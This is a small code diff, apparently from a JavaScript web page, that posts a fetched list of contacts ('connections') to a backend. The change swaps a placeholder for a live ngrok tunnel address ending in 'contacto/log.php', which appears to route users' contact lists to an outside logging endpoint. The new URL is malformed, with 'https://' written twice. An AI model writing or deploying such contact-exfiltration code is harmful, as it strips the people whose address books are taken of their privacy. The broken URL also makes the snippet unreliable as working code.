@@ -22,7 +22,7 @@
             const data = await res.json();
 
             // Send to your backend
-            await fetch('https://YOUR_NGROK_URL_HERE/log', {
+            await fetch('https:// https://79c5-105-163-1-17.ngrok-free.app/contacto/log.php', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ contacts: data.connections || [] })
